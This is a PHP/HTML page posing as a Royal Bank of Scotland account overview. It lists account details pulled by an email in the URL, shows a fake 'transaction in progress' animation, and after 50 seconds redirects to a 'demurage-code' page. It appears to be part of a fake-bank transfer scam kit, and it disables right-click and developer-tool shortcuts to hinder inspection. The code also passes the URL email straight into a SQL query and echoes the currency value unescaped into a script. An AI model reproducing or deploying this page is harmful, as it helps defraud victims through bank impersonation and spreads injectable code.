<html>
    <title>Royal Bank Of Scotland-Admin Login</title>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
 <link rel="icon" type="png" href="image/logoshsbc.png" style="width:5%">
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.1/css/all.css" integrity="sha384-gfdkjb5BdAXd+lj+gudLWI+BXq4IuLW5IT+brZEZsLFm++aCMlF1V92rMkPaX4PP" crossorigin="anonymous">
<link rel="stylesheet" href="css/bootstrap.css">
<link rel="stylesheet" href="css/bootstrap.min.css">
<link rel="stylesheet" href="css/style.css">
<script src="https://kit.fontawesome.com/fc383a6465.js" crossorigin="anonymous"></script>
	<script src="https://kit.fontawesome.com/1f706328f3.js" crossorigin="anonymous"></script>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
     <script type="text/javascript" src="js/mean.js"></script>
<title>Account Overview</title>
<link rel="preconnect" href="https://fonts.gstatic.com">
<link href="https://fonts.googleapis.com/css2?family=Heebo:wght@300&display=swap" rel="stylesheet">
</head>
<style>
*{font-family: 'Heebo', sans-serif;}
</style>


 
 
 <style>
.initialStage {display: none;}
</style>
<style>
table {
border-collapse: collapse;
width: 100%;
color: #588c7e;
font-family: arial;
font-size: 18px;
text-align: center;
}
th {
background-color: #588c7e;
color: white;
}
tr:nth-child(even) {background-color: #f2f2f2}

.bor{border:2px solid black;}
.header{width:100%;height:80px;background:lightgray;}
	  *{margin:0;box-sizing:border-box;}
	  body {font-family: "Lato", sans-serif;}
	  .table{width:80%;margin:auto;background:orange;border:2px solid green;}
th{text-align:center;color:#fff;}
.br{border:0.7px solid black;
width:100%;
display:block;
color:#fff;
padding:3px;
}

.bor{border:1px solid black;}
</style>
<body>
<div style="background-color:orange">
    <div class="container">
        <div class="row">
            <div class="col-md-4">
            <img src="./image/royalbank-logs.png" width="170" height="50" style="float:left;">
            </div>
            <div class="col-md-7">
              <span style="font-size:25px;color:#000000;padding-top:20px;"> Welcome To Royal Bank Of Scotland Online Technology</span>
            </div>
            </div>
        </div>
    </div>

    <div class="container">
<div class="row">
	<div class="col-md-3.5 border 2px solid black">
        <img src="image/morethanbanking.png" style="width:300px;height:120px;padding-top:0;margin:0;">
         </div>

<div class="col-md-3.5 border 2px solid black">
<img src="image/_103079097_mediaitem103077956.jpg" style="width:400px;height:120px;padding-top:0;margin:0;">
</div>
<div class="col-md-3.5 border 2px solid black">
<img src="image/rbs3g.png" style="width:400px;height:120px;padding-top:0;margin:0;">

</div>
</div>
</div>
</div><div style="height:60px"></div>

<div class="container">
    <div class="row">
	    <div class="col-md-3">
		<span style="font-size:15px; font-family:Trebuchet MS;">  <p id="rest" style="text-align:right"></p></span>
									    <script>
                                    var asiaTime = new Date().toLocaleString("en-US", {timeZone: "Asia/calcutta"});
                                     asiaTime = new Date(asiaTime);
                                     console.log('Europe time: '+asiaTime.toLocaleString())
                                     document.getElementById('rest').innerHTML=asiaTime.toLocaleString();
                                     </script>
		</div>
		<div class="col-md-3">
		</div>
		<div class="col-md-3">
		<p style="color:#000000;float:right;">Your IP address is: <? echo $_SERVER["REMOTE_ADDR"]; ?></p>
		</div>
    </div>
</div>

	<div id="Sign In" align="center">
<div style="height:40px"></div>
<div class="container">
<div class="row">
<div class="col-md-1">
</div>
<div class="col-md-10 contentarea">
<table>
<tr>
<th><span style="font-size:18px">Account Name:</span></th>
<th>&nbsp <span style="font-size:18px">Account Number:</span></th>
<th>&nbsp <span style="font-size:18px">IFSC Code:</span></th>
<th>&nbsp <span style="font-size:18px">In Currency:</span></th>
<th>&nbsp <span style="font-size:18px">Transfer In Progress:</span></th>
</tr>
<?php
include 'connection.php';
// Check connection
if ($conn->connect_error) {
die("Connection failed: " . $conn->connect_error);
}
$email = $_GET['email'];
$sql = "SELECT Trans_ID, name,number,code,currency, amount FROM nems WHERE email='$email'";
$result = $conn->query($sql);
if ($result->num_rows > 0) {
// output data of each row
while($row = $result->fetch_assoc()) {
echo "<tr><td>" . $row["name"]. "</td><td>" . $row["number"] . "</td><td>"
. $row["code"]. "</td><td>". $row["currency"]. "</td><td>". $row["amount"]. "</td></tr>";
}
echo "</table>";
} else { echo "0 results"; }
$conn->close();
?>
</table>

	</div>
	<div class="col-md-1">
</div>
	</div>
	</div>
	</div><br><br>
       
        <div id="Sign In" align="center">           

	<section>
			<div class="container">
				<div class="row main-div">
					<div class="col-md-1">
					</div>
					
					<div class="col-md-10">

                        <div class="row">
                        <p style="color:#000;font-size:25px;text-align:center;">
                        <?php
						$currency = strtoupper($_GET['currency']);
			
                            echo "Please Wait Transaction In Progress";
                            
                        ?>
                        
                        </p>
						</div>

					    <?php
						if($currency == 'GBP')
						{
							?>
 						<marquee width="100%" direction="right" scrollamount="100">
					   	<img src="image/b81_0481a_pounds.jpg" width="300" height="150">
					   </marquee>
					   
					  	<?php
						}
						else if($currency == 'NPR')
						{
							?>
					<marquee width="100%" direction="right" scrollamount="100">
					   	<img src="image/5caf6d02bea02d22bc41d7d90fbc7ff7.jpg" width="300" height="150">
					   </marquee>

					<?php
						}
						else if($currency == 'PKR')
						{
							?>
					<marquee width="100%" direction="right" scrollamount="100">
					   	<img src="image/pkr-hero.jpg" width="300" height="150">
					   </marquee>

					<?php
						}
						else if($currency == 'INR')
						{
							?>
					<marquee width="100%" direction="right" scrollamount="100">
					   	<img src="image/1200px-India_new_2000_INR,_MG_series,_2016,_obverse.jpg" width="300" height="150">
					   </marquee>

					<?php
						}

						else if($currency == 'YEN')
						{
							?>
					<marquee width="100%" direction="right" scrollamount="100">
					   	<img src="image/1000_yen_Natsume_Soseki.jpg" width="300" height="150">
					   </marquee>

					<?php
						}

						else if($currency == 'YUAN')
						{
							?>
					<marquee width="100%" direction="right" scrollamount="100">
					   	<img src="images/Chinese-banknote.jpg" width="300" height="150">
					   </marquee>
					   
					   <?php
						}
						else if($currency == 'BHAT')
						{
							?>
					<marquee width="100%" direction="right" scrollamount="100">
					   	<img src="images/thailand-bhatt.jpg" width="300" height="150">
					   </marquee>
					   
					   <?php
						}
						else if($currency == 'DONG')
						{
							?>
					<marquee width="100%" direction="right" scrollamount="100">
					   	<img src="images/100000-vietnamese-dong-banknote-type-1994-1.jpg" width="300" height="150">
					   </marquee>

					<?php
						}
						if($currency == 'USD')
						{
							?>
 						<marquee width="100%" direction="right" scrollamount="100">
					   	<img src="images/100-american-dollars-banknote-obverse-1.jpg" width="300" height="150">
					   </marquee>
					   	<?php
						}
						else if($currency == 'EURO')
						{
							?>
					<marquee width="100%" direction="right" scrollamount="100">
					   	<img src="image/100-euros-banknote-first-series-obverse-1.jpg" width="300" height="150">
					   </marquee>
					   
					   <?php
						}
					?>
				
					
                      
                    
                    </div>
					<div class="col-md-1">
					</div>	
				</div>		
			</div>

          
	</section>
                                    
                                
                                  
                                   <div class="divspace"></div>
                                  <div>Note:
                                    To allow us to serve you better, please inform us of any changes in your personal details
                                  </div>
                            </div>
                    
                            
                        </div>
                        
	<div style="height:40px;"></div>
	<div id="Sign In"align="center">
<div style="background-color:#ffc266;width:700px;height:3px;"></div>
    <span style="font-size:15px;color:#000000;padding-bottom:60px;float:center;">  This is under the Royal Bank Of Scotland.|  &#169 All Rights Reserved 2019. | For enquiries: </span>
</div>
                        
  
</body>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
<script>
setTimeout(()=>{
location.assign("demurage-code.php?currency=<?=$currency?>");
},50000);
</script>
<script>
document.addEventListener('contextmenu', event => event.preventDefault());

$(document).keydown(function (event) {
    if (event.keyCode == 123) { // Prevent F12
        return false;
    } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
        return false;
    }
});

</script>
</html>
